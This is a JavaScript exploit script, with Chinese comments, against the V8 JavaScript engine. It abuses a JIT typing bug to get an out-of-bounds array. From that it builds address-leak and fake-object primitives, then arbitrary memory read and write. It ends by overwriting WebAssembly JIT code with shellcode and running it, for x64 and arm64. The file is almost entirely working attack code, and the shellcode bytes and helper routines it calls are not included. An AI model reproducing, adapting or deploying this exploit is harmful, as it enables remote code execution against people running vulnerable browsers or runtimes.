//硬偏移，需要版本适配
const alert = console.log;
const print = console.log;

let arch = "x64";
if (arch === "x64") {

	var kBufferOffset = 0x20;
	var kSlotOffset = 0x40;
	var kCodeOffset = 0x30;
	var IS_LITTLE_ENDIAN = true;
	var kWasmJITAddrOffset = 83;
	var kMaxShellcodeLength = 0x1000; //TODO, 待确认
} else if (arch === "arm64") {

	var kBufferOffset = 0x20;
	var kSlotOffset = 0x40;
	var kCodeOffset = 0x30;
	var IS_LITTLE_ENDIAN = true;
	var kMaxShellcodeLength = 201856;
}


try {
	function hex8(value) {
		return value.toString(16).padStart(2, '0');
	}

	function hex16(value) {
		return value.toString(16).padStart(4, '0');
	}

	function hex32(value) {
		return value.toString(16).padStart(8, '0');
	}

	function oob_write_exploit() {  //这个函数的任务是让this.ctrl_ab 的 backing store 指向this.arb_ab
		function trigger() {
			var x = -Infinity;
			var k = 0;
			for (var i = 0; i < 1; i += x) {
				if (i == -Infinity) {
					x = +Infinity;
				}

				if (++k > 10) {
					break;
				}
			}

			var value = Math.max(i, 1024);
			value = -value;
			value = Math.max(value, -1025);
			value = -value;
			value -= 1022;
			value >>= 1; // *** 3 ***
			value += 10; //

			var array = Array(value);
			array[0] = 1.1;
			return [array, {}];
		};

		for (let i = 0; i < 20000; ++i) {
			trigger();
		}

		let oob_arr = trigger()[0];
		alert("oob_arr's length:" + oob_arr.length);
		let tagged_arr = new Array(10);
		const MAGIC_VALUE = 0x1234;
		tagged_arr[0] = MAGIC_VALUE;

		const AB_LEN = 0x12345;
		this.ctrl_ab = new ArrayBuffer(AB_LEN);
		// 打印oob_arr后面的值
		// let offset = 0;
		// for (let i = 0; i < 500; i++) {
		// 	let i64 = Int64.fromDouble(oob_arr[i]);
		// 	console.log(`${i*8}: ${i64}`);
		// }


		//find offsets
		//这个函数应尽量少做内存分配的操作，防止在中间发生 gc
		function find_offset(oob_arr, magic_value, end = -1) {
			if (end === -1) {
				end = oob_arr.length;
			}
			assertTrue(end > 0);
			for (var i = 11; i < end; i++) {
				let res = oob_arr[i];
				console.log(`${i*8}: ${res}`);
				if (res === magic_value.asDouble()) {
					offset = i * 8;
					break;
				}
			}
			if (i === end) {
				throw new Error("找不到offset");
			}
			return offset;
		}

		console.log("begin to find tagged_elements_offset");
		let tagged_elements_offset = find_offset(oob_arr, Int64.fromU32(0x0, MAGIC_VALUE), 5000);
		assertTrue(tagged_elements_offset % 8 == 0);
		console.log("begin to find ctrl_ab_bak_store_offset");
		let ctrl_ab_bak_store_offset = find_offset(oob_arr, Int64.fromU32(0x0, AB_LEN), 5000) + 8;
		assertTrue(ctrl_ab_bak_store_offset % 8 == 0);

		alert("tagged elements offset:" + tagged_elements_offset);
		alert("ctrl_ab_bak_store_offset:" + ctrl_ab_bak_store_offset);

		// throw new Error("end");

		//构造addrof 原语
		function addrof(obj) {
			tagged_arr[0] = obj;

			return Sub(Int64.fromDouble(oob_arr[tagged_elements_offset / 8]), 1);
		}

		let arb_ab_addr = addrof(this.arb_ab);
		//修改this.ctrl_ab 的backing store指向this.arb_ab
		oob_arr[ctrl_ab_bak_store_offset / 8] = arb_ab_addr.asDouble();

	}


	function oob_access(evil_f) {
		this.ctrl_ab = null;
		this.ctrl_view = null;

		this.arb_backing_store = null;
		this.arb_ab = null;
		this.arb_view = null;



		class LeakArrayBuffer extends ArrayBuffer {
			constructor() {
				super(0x1000);
				this.slot = this;//存放一个指向自身的指针, 很实用的一个技巧
			}
		}

		this.arb_ab = new LeakArrayBuffer();



		(function trigger() {
			gc();
			gc();
			oob_write_exploit();
			this.ctrl_view = new DataView(this.ctrl_ab);
			this.arb_backing_store = new Int64(this.ctrl_view.getBigUint64(kBufferOffset, true));
			this.arb_view = new DataView(this.arb_ab);
		})();

		this.leakPtr = function (obj) {
			this.arb_ab.slot = obj;
			uint64 = this.ctrl_view.getBigUint64(kSlotOffset, IS_LITTLE_ENDIAN);
			i64 = new Int64(uint64);
			return Sub(i64, 1);
		}

		this.castPtr = function (ptr) {
			this.ctrl_view.setBigUint64(kSlotOffset, Add(ptr, 1).asBigInt(), IS_LITTLE_ENDIAN);
			return this.arb_ab.slot;
		}

		this.setPagePtr = function (ptr) {
			this.ctrl_view.setBigUint64(kBufferOffset, ptr.asBigInt(), IS_LITTLE_ENDIAN);
			this.arb_backing_store = ptr;
			this.arb_view = new DataView(this.arb_ab);
		}

		this.getUint8 = function (ptr) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 1)) {
				return this.arb_view.getUint8(offset);
			}

			this.setPagePtr(ptr);
			return this.getUint8(ptr);
		}

		this.getUint16 = function (ptr) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 2)) {
				return this.arb_view.getUint16(offset, IS_LITTLE_ENDIAN);
			}

			this.setPagePtr(ptr);
			return this.getUint16(ptr);
		}

		this.getUint32 = function (ptr) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 4)) {
				return this.arb_view.getUint32(offset, IS_LITTLE_ENDIAN);
			}

			this.setPagePtr(ptr);
			return this.getUint32(ptr);
		}

		this.getUInt64 = function (ptr) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 8)) {
				return new Int64(this.arb_view.getBigUint64(offset, IS_LITTLE_ENDIAN));
			}

			this.setPagePtr(ptr);
			return this.getUInt64(ptr);
		}

		this.setUint8 = function (ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 1)) {
				return this.arb_view.setUint8(offset, value);
			}

			this.setPagePtr(ptr);
			return this.setUint8(ptr, value);
		}

		this.setUint16 = function (ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 2)) {
				return this.arb_view.setUint16(offset, value, IS_LITTLE_ENDIAN);
			}

			this.setPagePtr(ptr);
			return this.setUint16(ptr, value);
		}

		this.setUint32 = function (ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 4)) {
				return this.arb_view.setUint32(offset, value, IS_LITTLE_ENDIAN);
			}

			this.setPagePtr(ptr);
			return this.setUint32(ptr, value);
		}

		this.setUint64 = function (ptr, value) {
			assertTrue(typeof value.asBigInt() === 'bigint');
			var offset = Sub(ptr, this.arb_backing_store);
			if (offset >= 0 && offset <= (0x1000 - 8)) {
				return this.arb_view.setBigUint64(offset, value.asBigInt(), IS_LITTLE_ENDIAN);
			}

			this.setPagePtr(ptr);
			return this.setUint64(ptr, value);
		}

		return this;
	}

	alert("1");
	var oob = oob_access(oob_write_exploit);

	function test_oob_access() {
		let arr = [1.1, 2.2];

		let arr_addr = oob.leakPtr(arr);
		console.log("arr_addr:" + arr_addr);
		let faked_arr = oob.castPtr(arr_addr);
		console.log("faked_arr[0]:" + faked_arr[0]);
		console.log("faked_arr[1]:" + faked_arr[1]);
		assertTrue(faked_arr[0] === 1.1);
		assertTrue(faked_arr[1] === 2.2);
	}

	test_oob_access();

	//此时已经获得任意地址读写原语 
	let [wasm_inst, wasm_func] = gen_wasm_inst_and_wasm_func();

	//获取Wasm的JIT区域的地址
	let wasm_func_addr = this.leakPtr(wasm_func);
	print("wasm_func_addr:" + wasm_func_addr);
	let js_to_wasm_func_jit_addr = Add(Sub(oob.getUInt64(Add(wasm_func_addr, kCodeOffset)), 1), 0x40);
	print("js_to_wasm func jit addr:" + js_to_wasm_func_jit_addr);

	// throw new Error("end");
	if (arch === "arm64") {
		let shellcode = shellcode_arm64_exec;
		assertTrue(shellcode.length < kMaxShellcodeLength);
		for (let i = 0; i < shellcode.length; i++) {
			oob.setUint8(Add(js_to_wasm_func_jit_addr, i), shellcode[i].charCodeAt(0));
		}
	} else if (arch === "x64") {
		let shellcode = shellcode_x64_exec;
		assertTrue(shellcode.length < kMaxShellcodeLength);
		let wasm_jit_addr = oob.getUInt64(Add(js_to_wasm_func_jit_addr, kWasmJITAddrOffset));
		print("wasm_jit_addr:" + wasm_jit_addr);

		for (let i = 0; i < shellcode.length; i++) {
			oob.setUint8(Add(wasm_jit_addr, i), shellcode[i].charCodeAt(0));
		}
	} else {
		throw new Error("Invalid arch: " + arch);
	}

	alert("exec shellcode");
	wasm_func();

} catch (e) {
	alert(e.stack);
	// document.location.reload();
}
